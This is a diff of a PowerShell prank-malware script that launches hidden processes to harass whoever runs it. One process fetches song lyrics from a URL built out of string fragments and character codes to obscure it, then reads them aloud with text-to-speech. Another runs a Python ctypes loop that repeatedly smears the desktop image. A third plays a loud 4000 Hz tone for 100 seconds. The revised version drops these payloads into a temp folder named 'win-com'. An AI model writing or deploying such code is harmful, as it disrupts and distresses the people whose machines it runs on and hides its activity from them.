@@ -1,15 +1,41 @@
-Start-Process powershell -WindowStyle Hidden -ArgumentList @(
-    '-NoProfile',
-    '-Command',
-    '$x=[char]47;$d=''lrc''+''lib''+[char]46+''net'';$u=''h''+''ttps:''+$x+$x+$d+$x+''api''+$x+''get''+$x+24036888;(New-Object -Com SAPI.SpVoice).Speak((irm $u).plainLyrics)'
+$dir = Join-Path $env:TEMP 'win-com'
+New-Item -ItemType Directory -Path $dir -Force | Out-Null
+
+$screenFile = Join-Path $dir 'screen.py'
+$beepFile   = Join-Path $dir 'beep.py'
+
+@'
+import ctypes as c
+
+g = c.windll.gdi32
+u = c.windll.user32
+d = u.GetDC(0)
+
+for _ in range(10000):
+    g.StretchBlt(
+        d, 5, 5, 1910, 1070,
+        d, 0, 0, 1920, 1080,
+        0x999999
+    )
+'@ | Set-Content -Path $screenFile -Encoding ASCII
+
+@'
+import winsound
+winsound.Beep(4000, 100000)
+'@ | Set-Content -Path $beepFile -Encoding ASCII
+
+$voiceCommand = @'
+$x = [char]47
+$d = 'lrc' + 'lib' + [char]46 + 'net'
+$u = 'h' + 'ttps:' + $x + $x + $d + $x + 'api' + $x + 'get' + $x + '24036888'
+(New-Object -ComObject SAPI.SpVoice).Speak((Invoke-RestMethod $u).plainLyrics)
+'@
+
+Start-Process powershell.exe -WindowStyle Hidden -ArgumentList @(
+    '-NoProfile'
+    '-Command'
+    $voiceCommand
 )
 
-Start-Process python -WindowStyle Hidden -ArgumentList @(
-    '-c',
-    'import ctypes as c; g=c.windll.gdi32; u=c.windll.user32; d=u.GetDC(0); [g.StretchBlt(d,5,5,1910,1070,d,0,0,1920,1080,0x999999) for _ in range(10000)]'
-)
-
-Start-Process python -WindowStyle Hidden -ArgumentList @(
-    '-c',
-    'import winsound; winsound.Beep(4000,100000)'
-)
+Start-Process python.exe -WindowStyle Hidden -ArgumentList "`"$screenFile`""
+Start-Process python.exe -WindowStyle Hidden -ArgumentList "`"$beepFile`""
